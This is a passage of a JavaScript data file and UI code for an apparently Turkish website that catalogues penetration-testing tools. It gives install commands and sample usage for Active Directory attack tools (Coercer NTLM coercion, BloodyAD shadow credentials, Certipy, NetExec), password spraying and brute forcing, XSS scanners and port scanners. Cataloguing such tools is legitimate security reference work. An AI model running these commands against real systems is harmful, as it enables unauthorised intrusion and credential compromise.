    tags: ['Wordlist', 'Koleksiyon'],
    tagColor: 'blue',
    features: ['Username listeleri','Password listeleri','Web content listeleri','Network listeleri','Fuzzing listeleri'],
    install: 'sudo apt update && sudo apt install -y seclists',
    usage: [{ title: 'RockYou', code: 'cat /usr/share/wordlists/rockyou.txt' },{ title: 'Common', code: 'cat /usr/share/seclists/Discovery/Web-Content/common.txt' }]
  },
  {
    id: 'commoncrawl',
    name: 'CommonCrawl Index',
    desc: 'Web arşivi indeks sorgulama aracı.',
    fullDesc: 'CommonCrawl, web arşivinde indeks sorgulamak için kullanılır.',
    icon: 'fa-database',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'Web Arşivi'],
    tagColor: '',
    features: ['Web arşivi indeks','URL sorgulama','Alt alan adı keşfi','Zaman damgası filtresi','API desteği'],
    install: 'pip3 install commoncrawl',
    usage: [{ title: 'Index', code: 'curl -s "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=hedef.com/*&output=json"' }]
  },
  {
    id: 'waybackurls',
    name: 'Waybackurls',
    desc: 'Wayback Machine URL\'lerini toplama aracı.',
    fullDesc: 'Waybackurls, Wayback Machine\'den URL\'leri toplamak için kullanılır.',
    icon: 'fa-clock-rotate-left',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'Wayback'],
    tagColor: 'orange',
    features: ['Wayback Machine URL toplama','Toplu sorgulama','Filtreleme','Pipe desteği','Hızlı sorgulama'],
    install: 'go install github.com/tomnomnom/waybackurls@latest',
    usage: [{ title: 'URL Toplama', code: 'echo hedef.com | waybackurls' },{ title: 'Filtreleme', code: 'echo hedef.com | waybackurls | grep ".php"' }]
  },
  {
    id: 'gau',
    name: 'GAU',
    desc: 'Tüm URL\'leri toplama aracı.',
    fullDesc: 'GAU (Get All URLs), various web archives\'dan URL\'leri toplar.',
    icon: 'fa-globe',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'URL'],
    tagColor: 'cyan',
    features: ['Çoklu arşiv kaynağı','Wayback/CommonCrawl/OTX','Hızlı toplama','JSON çıktı','Filtreleme'],
    install: 'go install github.com/lc/gau/v2/cmd/gau@latest',
    usage: [{ title: 'Toplama', code: 'echo hedef.com | gau' },{ title: 'Filtre', code: 'echo hedef.com | gau --threads 5 | grep ".php"' }]
  },
  {
    id: 'xsstrike',
    name: 'XSStrike',
    desc: 'XSS zafiyet bulma aracı.',
    fullDesc: 'XSStrike, XSS zafiyetlerini bulmak için gelişmiş bir araçtır.',
    icon: 'fa-xmark',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['XSS', 'Zafiyet'],
    tagColor: 'red',
    features: ['Otomatik payload oluşturma','Reflected/Stored/DOM XSS','Fuzzer','WAF bypass','Crawling'],
    install: 'git clone https://github.com/s0md3v/XSStrike.git',
    usage: [{ title: 'Tarama', code: 'python xsstrike.py -u "http://hedef.com/?q=test"' },{ title: 'Crawl', code: 'python xsstrike.py -u "http://hedef.com" --crawl' }]
  },
  {
    id: 'dalfox',
    name: 'DalFox',
    desc: 'XSS zafiyet analiz ve parametre analiz aracı.',
    fullDesc: 'DalFox, XSS zafiyetlerini analiz etmek için güçlü bir araçtır.',
    icon: 'fa-fire',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['XSS', 'Analiz'],
    tagColor: 'orange',
    features: ['Parameter analizi','XSS tarama','WAF detection','盲 test','Çıktı formatları'],
    install: 'sudo apt update && sudo apt install -y dalfox',
    usage: [{ title: 'URL', code: 'dalfox url "http://hedef.com/?q=test"' },{ title: 'Pipe', code: 'cat urls.txt | dalfox pipe' }]
  },
  {
    id: 'corscanner',
    name: 'CORScanner',
    desc: 'CORS zafiyet tarayıcısı.',
    fullDesc: 'CORScanner, CORS (Cross-Origin Resource Sharing) zafiyetlerini tarar.',
    icon: 'fa-code-branch',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['CORS', 'Zafiyet'],
    tagColor: 'cyan',
    features: ['CORS zafiyet tarama','Origin bypass','Wildcard tespiti','Header analizi','Çıktı formatları'],
    install: 'pip3 install corscanner',
    usage: [{ title: 'Tarama', code: 'python corscanner.py -i hedefler.txt -o results.txt' }]
  },
  {
    id: 'subjack',
    name: 'Subjack',
    desc: 'Subdomain takeover aracı.',
    fullDesc: 'Subjack, subdomain takeover zafiyetlerini tespit eder.',
    icon: 'fa-handshake',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Subdomain Takeover', 'Zafiyet'],
    tagColor: 'pink',
    features: ['Subdomain takeover tespiti','Fingerprinting','Çoklu provider','Hızlı tarama','JSON çıktı'],
    install: 'go install github.com/haccer/subjack@latest',
    usage: [{ title: 'Tarama', code: 'subjack -w subdomains.txt -t 100 -timeout 30' },{ title: 'Fingerprint', code: 'subjack -w subdomains.txt -t 100 -a fingerprints.json' }]
  },
  {
    id: 'nmap-vulners',
    name: 'Nmap Vulners',
    desc: 'Nmap ile zafiyet tarama eklentisi.',
    fullDesc: 'nmap-vulners, Nmap\'e zafiyet tarama özelliği katan birNSE scriptidir.',
    icon: 'fa-bug',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['vulnerability'],
    tags: ['Nmap', 'Zafiyet'],
    tagColor: 'red',
    features: ['CVE tarama','CVSS skoru','Exploit eşleştirme','Otomatik tarama','Detaylı çıktı'],
    install: 'sudo cp /usr/share/nmap/scripts/vulners.nse /usr/share/nmap/scripts/',
    usage: [{ title: 'Tarama', code: 'nmap -sV --script vulners hedef.com' }]
  },
  {
    id: 'vulnernmap',
    name: 'Vulscan',
    desc: 'Nmap ile yerel zafiyet veritabanı taraması.',
    fullDesc: 'Vulscan, Nmap servis sonuçlarını yerel CVE veritabanlarıyla eşleştirir.',
    icon: 'fa-database',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['vulnerability'],
    tags: ['Nmap', 'CVE'],
    tagColor: 'orange',
    features: ['Yerel CVE veritabanı','Çoklu kaynak','Hızlı eşleştirme','Otomatik güncelleme','Detaylı çıktı'],
    install: 'git clone https://github.com/scipag/vulscan.git /usr/share/nmap/scripts/vulscan',
    usage: [{ title: 'Tarama', code: 'nmap -sV --script vulscan/vulscan.nse hedef.com' },{ title: 'Özel DB', code: 'nmap -sV --script vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv hedef.com' }]
  },
  {
    id: 'bloodhound',
    name: 'BloodHound',
    desc: 'Active Directory saldırı yollarını haritalandırma.',
    fullDesc: 'BloodHound, Active Directory\'de saldırı yollarını görselleştirir.',
    icon: 'fa-diagram-project',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['Active Directory', 'Graph'],
    tagColor: 'red',
    features: ['AD saldırı yolu haritalama','Shortest path bulma','Kerberoasting tespiti','Görsel grafik','SharpHound collector'],
    install: 'sudo apt update && sudo apt install -y bloodhound',
    usage: [{ title: 'Başlatma', code: 'sudo bloodhound-python -u admin -p pass -d hedef.com -c All' },{ title: 'GUI', code: 'sudo bloodhound' }]
  },
  {
    id: 'certipy',
    name: 'Certipy',
    desc: 'AD Certificate Services zafiyet aracı.',
    fullDesc: 'Certipy, Active Directory Certificate Services (AD CS) zafiyetlerini sömürmek için kullanılır.',
    icon: 'fa-certificate',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['AD CS', 'Certificate'],
    tagColor: '',
    features: ['AD CS enumeration','ESC zafiyetleri','Certificate enrollment','NTLM relay','Username-based enum'],
    install: 'pip3 install certipy-ad',
    usage: [{ title: 'Enum', code: 'certipy find -u admin@hedef.com -p pass123 -dc-ip 192.168.1.100' },{ title: 'Cert Request', code: 'certipy req -u admin@hedef.com -p pass123 -ca CA-NAME -template Template' }]
  },
  {
    id: 'coercer',
    name: 'Coercer',
    desc: 'NTLM relay saldırıları için coercion aracı.',
    fullDesc: 'Coercer, NTLM relay saldırıları için sunucuları coercion (zorlama) yapar.',
    icon: 'fa-hand-fist',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['NTLM', 'Relay'],
    tagColor: 'red',
    features: ['NTLM coercion saldırıları','MS-RPRN/NRPC/DFSC','Otomatik mod','Çoklu protocol','Pipe listing'],
    install: 'pip3 install coercer',
    usage: [{ title: 'Saldırı', code: 'coercer -t 192.168.1.100 -u admin -p pass123 --method MS-RPRN' },{ title: 'List', code: 'coercer -t 192.168.1.100 --list-methods' }]
  },
  {
    id: 'bloodyAD',
    name: 'BloodyAD',
    desc: 'Active Directory manipülasyon aracı.',
    fullDesc: 'BloodyAD, Active Directory\'de nesne manipülasyonu için kullanılır.',
    icon: 'fa-skull-crossbones',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['AD', 'Manipülasyon'],
    tagColor: 'red',
    features: ['AD object manipulate','Shadow credentials','RBCD/DSCSync','Password change','Object creation'],
    install: 'pip3 install bloodyAD',
    usage: [{ title: 'Shadow Credentials', code: 'bloodyAD -d hedef.com -u admin -p pass123 --host 192.168.1.100 add shadowCredentials targetuser' }]
  },
  {
    id: 'ldapdomaindump',
    name: 'ldapdomaindump',
    desc: 'LDAP domain bilgilerini dumped araç.',
    fullDesc: 'ldapdomaindump, Active Directory LDAP bilgilerini HTML/JSON formatında dump eder.',
    icon: 'fa-server',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['LDAP', 'AD'],
    tagColor: 'blue',
    features: ['LDAP domain dump','HTML/JSON çıktısı','User/Group/Computer','GPO bilgisi','Otomatik'],
    install: 'pip3 install ldapdomaindump',
    usage: [{ title: 'Dump', code: 'ldapdomaindump -u hedef.com/admin -p pass123 192.168.1.100' }]
  },
  {
    id: 'ldeep',
    name: 'LDeep',
    desc: 'LDAP enumarasyon ve LAPS aracı.',
    fullDesc: 'LDeep, LDAP tabanlı enumeration ve LAPS password okuma için kullanılır.',
    icon: 'fa-magnifying-glass',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['LDAP', 'LAPS'],
    tagColor: 'cyan',
    features: ['LDAP enumeration','LAPS password','Trust relationship','Group policy','Certificate templates'],
    install: 'pip3 install ldeep',
    usage: [{ title: 'Users', code: 'ldeep ldap -u admin -p pass123 -d hedef.com -s ldap://192.168.1.100 all users' },{ title: 'LAPS', code: 'ldeep ldap -u admin -p pass123 -d hedef.com -s ldap://192.168.1.100 laps' }]
  },
  {
    id: 'adidnsdump',
    name: 'adidnsdump',
    desc: 'Active Directory DNS kayıtları dump aracı.',
    fullDesc: 'adidnsdump, AD DNS zone kayıtlarını dump eder.',
    icon: 'fa-server',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['DNS', 'AD'],
    tagColor: '',
    features: ['AD DNS dump','Zone transfer','Record resolution','Output CSV','Authenticated dump'],
    install: 'pip3 install adidnsdump',
    usage: [{ title: 'Dump', code: 'adidnsdump -u admin@hedef.com -p pass123 192.168.1.100' },{ title: 'Resolve', code: 'adidnsdump -u admin@hedef.com -p pass123 -r 192.168.1.100' }]
  },
  {
    id: 'spray',
    name: 'Spray',
    desc: 'Active Directory parola sıfırlama/spray aracı.',
    fullDesc: 'Spray, AD\'de parola spray saldırıları için kullanılır.',
    icon: 'fa-shower',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['password', 'exploit'],
    tags: ['AD', 'Password Spray'],
    tagColor: 'orange',
    features: ['Parola spray','Lockout-aware','Kerberos/NTLM','Çoklu domain','Otomatik lockout avoidance'],
    install: 'pip3 install password-sprayer',
    usage: [{ title: 'Spray', code: 'spray --domain hedef.com --userlist users.txt --password Winter2024!' }]
  },
  {
    id: 'brutespray',
    name: 'BruteSpray',
    desc: 'Nmap çıktısından brute-force aracı.',
    fullDesc: 'BruteSpray, Nmap çıktısını okuyarak otomatik brute-force yapar.',
    icon: 'fa-brush',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['password'],
    tags: ['Brute Force', 'Nmap'],
    tagColor: 'red',
    features: ['Nmap GNMAP okuma','Otomatik servis tespiti','Çoklu thread','Paralel saldırı','Çıktı dosyası'],
    install: 'sudo apt update && sudo apt install -y brutespray',
    usage: [{ title: 'Brute', code: 'brutespray -f /root/nmap_output.gnmap -u admin -P passwords.txt' }]
  },
  {
    id: 'nedb',
    name: 'NetExec',
    desc: 'CrackMapExec\'in halefi - Ağ saldırganlık aracı.',
    fullDesc: 'NetExec (nxc), CrackMapExec\'in modern halefidir.',
    icon: 'fa-terminal',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['exploit', 'password'],
    tags: ['Post-Exploit', 'NXC'],
    tagColor: 'cyan',
    features: ['SMB/WinRM/SSH/LDAP','Credential spray','Pass-the-Hash','Lateral movement','Module support'],
    install: 'pip3 install netexec',
    usage: [{ title: 'SMB', code: 'nxc smb 192.168.1.0/24 -u admin -p pass123' },{ title: 'WinRM', code: 'nxc winrm 192.168.1.100 -u admin -p pass123' }]
  },
  {
    id: 'ssh-audit',
    name: 'ssh-audit',
    desc: 'SSH servis güvenlik denetimi aracı.',
    fullDesc: 'ssh-audit, SSH sunucularının güvenlik yapılandırmasını denetler.',
    icon: 'fa-shield-halved',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['vulnerability'],
    tags: ['SSH', 'Denetim'],
    tagColor: '',
    features: ['SSH algoritma denetimi','Zayıf algoritma tespiti','Güvenli yapılandırma önerileri','Banner reading','Algorithms listesi'],
    install: 'sudo apt update && sudo apt install -y ssh-audit',
    usage: [{ title: 'Denetim', code: 'ssh-audit hedef.com' },{ title: 'Port', code: 'ssh-audit hedef.com:2222' }]
  },
  {
    id: 'sslyze',
    name: 'SSLyze',
    desc: 'SSL/TLS yapılandırma analiz aracı.',
    fullDesc: 'SSLyze, SSL/TLS yapılandırmalarını analiz eder ve zafiyetleri tespit eder.',
    icon: 'fa-lock',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['vulnerability'],
    tags: ['SSL', 'TLS', 'Analiz'],
    tagColor: 'blue',
    features: ['SSL/TLS yapılandırma','Zafiyet tarama','Sertifika analizi','Heartbleed testi','JSON çıktısı'],
    install: 'pip3 install sslyze',
    usage: [{ title: 'Analiz', code: 'sslyze hedef.com' },{ title: 'JSON', code: 'sslyze --json_out=sonuc.json hedef.com' }]
  },
  {
    id: 'testssl',
    name: 'testssl.sh',
    desc: 'SSL/TLS kapsamlı tarama aracı.',
    fullDesc: 'testssl.sh, SSL/TLS servislerini kapsamlı şekilde tarar.',
    icon: 'fa-magnifying-glass',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['vulnerability'],
    tags: ['SSL', 'TLS', 'Tarama'],
    tagColor: 'red',
    features: ['Kapsamlı SSL tarama','300+ zafiyet kontrolü','Cipher suite analizi','Protocol testi','HTML rapor'],
    install: 'sudo apt update && sudo apt install -y testssl.sh',
    usage: [{ title: 'Tarama', code: 'testssl hedef.com' },{ title: 'HTML', code: 'testssl --htmlfile rapor.html hedef.com' }]
  },
  {
    id: 'rathole',
    name: 'Rathole',
    desc: 'TCP/UDP tünel ve port forwarding aracı.',
    fullDesc: 'Rathole, güvenli TCP/UDP tünel oluşturma için Rust tabanlı bir araçtır.',
    icon: 'fa-route',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi'],
    tags: ['Tünel', 'Port Forwarding'],
    tagColor: 'orange',
    features: ['TCP/UDP tünel','TLS şifreleme','Çoklu service','NAT traversal','Düşük gecikme'],
    install: 'cargo install rathole',
    usage: [{ title: 'Sunucu', code: 'rathole --config server.toml' },{ title: 'İstemci', code: 'rathole --config client.toml' }]
  },
  {
    id: 'ppfuzz',
    name: 'ppfuzz',
    desc: 'Path traversal fuzzing aracı.',
    fullDesc: 'ppfuzz, path traversal (dizin geçiş) zafiyetleri için fuzzing yapar.',
    icon: 'fa-folder-open',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Path Traversal', 'Fuzzing'],
    tagColor: 'purple',
    features: ['Path traversal fuzzing','Çoklu payload','Recursive traversal','Filtreleme','Hızlı performans'],
    install: 'cargo install ppfuzz',
    usage: [{ title: 'Fuzz', code: 'cat urls.txt | ppfuzz' }]
  },
  {
    id: 'dirstalk',
    name: 'DirStalk',
    desc: 'Web dizin ve dosya keşfetme aracı.',
    fullDesc: 'DirStalk, web sunucularında gizli dizin ve dosyaları keşfeder.',
    icon: 'fa-folder-tree',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Dizin', 'Keşif'],
    tagColor: 'cyan',
    features: ['Çoklu thread','Farklı HTTP methods','Result filtreleme','Custom headers','Rate limiting'],
    install: 'cargo install dirstalk',
    usage: [{ title: 'Keşif', code: 'dirstalk http://hedef.com --wordlist wordlist.txt' }]
  },
  {
    id: 'rustscan',
    name: 'RustScan',
    desc: 'Rust tabanlı hızlı port tarayıcı.',
    fullDesc: 'RustScan, Rust ile yazılmış çok hızlı bir port tarayıcıdır.',
    icon: 'fa-bolt-lightning',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['bilgi'],
    tags: ['Port Tarama', 'Rust'],
    tagColor: 'red',
    features: ['Çok hızlı tarama','Nmap entegrasyonu','Adaptive tarama','Batch processing','IPv4/IPv6'],
    install: 'sudo apt update && sudo apt install -y rustscan',
    usage: [{ title: 'Tarama', code: 'rustscan -a 192.168.1.1' },{ title: 'Nmap', code: 'rustscan -a 192.168.1.1 -- -sV' }]
  },
  {
    id: 'naabu',
    name: 'Naabu',
    desc: 'Hızlı port tarayıcı (Go tabanlı).',
    fullDesc: 'Naabu, Go ile yazılmış hızlı bir port tarayıcısıdır.',
    icon: 'fa-bolt',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['Port Tarama', 'Go'],
    tagColor: '',
    features: ['TCP/HTTP/HTTPS/SOCKS5','Hızlı tarama','Host discovery','Exclude list','JSON çıktı'],
    install: 'sudo apt update && sudo apt install -y naabu',
    usage: [{ title: 'Tarama', code: 'naabu -host 192.168.1.1' },{ title: 'Port', code: 'naabu -host 192.168.1.1 -top-ports 1000' }]
  },
  {
    id: 'dnsx',
    name: 'dnsx',
    desc: 'Çoklu DNS resolver ve enumeration aracı.',
    fullDesc: 'dnsx, çoklu DNS resolver ve enumeration için güçlü bir araçtır.',
    icon: 'fa-globe',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['DNS', 'Enumeration'],
    tagColor: 'blue',
    features: ['Çoklu DNS resolver','Subdomain brute-force','DNS record lookup','JSON çıktı','Pipe input'],
    install: 'sudo apt update && sudo apt install -y dnsx',
    usage: [{ title: 'DNS', code: 'dnsx -d hedef.com -resolvers resolvers.txt' },{ title: 'Brute', code: 'dnsx -d hedef.com -w subdomains.txt -r resolvers.txt' }]
  },
  {
    id: 'mapcidr',
    name: 'mapCIDR',
    desc: 'CIDR aralıklarını haritalandırma aracı.',
    fullDesc: 'mapCIDR, CIDR aralıklarını haritalandırmak ve filtrelemek için kullanılır.',
    icon: 'fa-map',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi'],
    tags: ['CIDR', 'Ağ'],
    tagColor: 'orange',
    features: ['CIDR haritalama','IP listesi oluşturma','Aralık dönüşümü','Şebeke analizi','Hızlı işleme'],
    install: 'sudo apt update && sudo apt install -y mapcidr',
    usage: [{ title: 'Haritalama', code: 'echo 192.168.0.0/24 | mapcidr' }]
  },
  {
    id: 'uncover',
    name: 'uncover',
    desc: 'Çoklu motorlardan gizli hedefleri bulma aracı.',
    fullDesc: 'uncover, Shodan/Censys/FOFA gibi motorlardan gizli hedefleri keşfeder.',
    icon: 'fa-magnifying-glass',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'Motor'],
    tagColor: 'pink',
    features: ['Çoklu search engine','Shodan/Censys/FOFA','Rate limiting','JSON çıktı','Pipe input'],
    install: 'sudo apt update && sudo apt install -y uncover',
    usage: [{ title: 'Keşif', code: 'uncover -q "org:hedef" -e shodan,censys' }]
  },
  {
    id: 'alterx',
    name: 'alterx',
    desc: 'Alt alan adı değişkenleri oluşturma aracı.',
    fullDesc: 'alterx, alt alan adı permutation ve mutasyon için kullanılır.',
    icon: 'fa-shuffle',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['Subdomain', 'Mutation'],
    tagColor: '',
    features: ['Subdomain permutation','Enrichment','Wordlist-based','Variable substitution','Pipe input'],
    install: 'sudo apt update && sudo apt install -y alterx',
    usage: [{ title: 'Permütasyon', code: 'echo hedef.com | alterx' },{ title: 'Özel', code: 'echo hedef.com | alterx -e "prod-{{word}}"' }]
  }
];

function getToolById(id) {
  return toolsData.find(t => t.id === id);
}

function getToolsByCategory(category) {
  if (category === 'all') return toolsData;
  return toolsData.filter(t => t.cat.includes(category));
}

let toolsBasePath = 'pages/tool-detail.html';

function setToolsBasePath(path) {
  toolsBasePath = path;
}

const TOOLS_PER_PAGE = 12;

function renderTools(container, data, page) {
  page = page || 1;
  const start = (page - 1) * TOOLS_PER_PAGE;
  const end = start + TOOLS_PER_PAGE;
  const paginatedData = data.slice(start, end);
  const totalPages = Math.ceil(data.length / TOOLS_PER_PAGE);

  let html = paginatedData.map(t => {
    const tags = t.tags.map(tag =>
      `<span class="tag ${t.tagColor || ''}">${tag}</span>`
    ).join('');
    return `
      <a href="${toolsBasePath}?tool=${t.id}" class="tool-card">
        <div class="card-icon" style="background:${t.bg};color:${t.color}">
          <i class="fas ${t.icon}"></i>
        </div>
        <h3>${t.name}</h3>
        <p>${t.desc}</p>
        <div class="tags">${tags}</div>
      </a>
    `;
  }).join('');

  if (totalPages > 1) {
    html += '<div class="pagination">';
    if (page > 1) {
      html += `<button class="page-btn" data-page="${page - 1}"><i class="fas fa-chevron-left"></i></button>`;
    }
    for (let i = 1; i <= totalPages; i++) {
      html += `<button class="page-btn ${i === page ? 'active' : ''}" data-page="${i}">${i}</button>`;
    }
    if (page < totalPages) {
      html += `<button class="page-btn" data-page="${page + 1}"><i class="fas fa-chevron-right"></i></button>`;
    }
    html += '</div>';
  }

  container.innerHTML = html;
}

/* ─── UTILITY FUNCTIONS ─── */
function initNavbar() {
  const navbar = document.getElementById('navbar');
  const toggle = document.getElementById('navToggle');
  const links = document.querySelector('.nav-links');

  window.addEventListener('scroll', () => {
    navbar.classList.toggle('scrolled', window.scrollY > 50);
  });

  if (toggle) {
    toggle.addEventListener('click', () => {
      links.classList.toggle('open');
    });
  }

  if (links) {
    links.querySelectorAll('a').forEach(link => {
      link.addEventListener('click', () => {
        links.classList.remove('open');
      });
    });
  }
}

function initBackToTop() {
  const btn = document.createElement('button');
  btn.className = 'back-to-top';
  btn.innerHTML = '<i class="fas fa-arrow-up"></i>';
  btn.setAttribute('aria-label', 'Yukarı Çık');
  document.body.appendChild(btn);

  window.addEventListener('scroll', () => {
    btn.classList.toggle('visible', window.scrollY > 400);
  });

  btn.addEventListener('click', () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
}

function initCopyButtons() {
  document.querySelectorAll('.code-block').forEach(block => {
    const btn = document.createElement('button');
    btn.className = 'copy-btn';
    btn.innerHTML = '<i class="fas fa-copy"></i>';
    btn.setAttribute('data-tooltip', 'Kopyala');
    block.appendChild(btn);

    btn.addEventListener('click', async () => {
      const code = block.querySelector('pre code').textContent;
      try {
        await navigator.clipboard.writeText(code);
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.classList.add('copied');
        setTimeout(() => {
          btn.innerHTML = '<i class="fas fa-copy"></i>';
          btn.classList.remove('copied');
        }, 2000);
      } catch {
        btn.innerHTML = '<i class="fas fa-times"></i>';
        setTimeout(() => {
          btn.innerHTML = '<i class="fas fa-copy"></i>';
        }, 2000);
      }
    });
  });
}

function initScrollReveal() {
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.1 });

  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
}

function showToast(message, type) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = `toast ${type || ''}`;
  toast.textContent = message;
  document.body.appendChild(toast);

  requestAnimationFrame(() => {
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
      setTimeout(() => toast.remove(), 400);
    }, 3000);
  });
}

function getCategoryCount(category) {
  return toolsData.filter(t => t.cat.includes(category)).length;
}

function getStats() {
  return {
    total: toolsData.length,
    bilgi: getCategoryCount('bilgi'),
    vulnerability: getCategoryCount('vulnerability'),
    exploit: getCategoryCount('exploit'),
    password: getCategoryCount('password'),
    wireless: getCategoryCount('wireless'),
    web: getCategoryCount('web'),
    forensic: getCategoryCount('forensic')
  };
}

document.addEventListener('DOMContentLoaded', () => {
  initNavbar();
  initBackToTop();
  initScrollReveal();
  initCopyButtons();

  const themeToggle = document.getElementById('themeToggle');
  if (themeToggle) {
    const saved = localStorage.getItem('theme');
    if (saved === 'light') document.body.classList.add('light-theme');
    themeToggle.addEventListener('click', () => {
      document.body.classList.toggle('light-theme');
      localStorage.setItem('theme', document.body.classList.contains('light-theme') ? 'light' : 'dark');
      const icon = themeToggle.querySelector('i');
      icon.className = document.body.classList.contains('light-theme') ? 'fas fa-moon' : 'fas fa-sun';
    });
  }
});
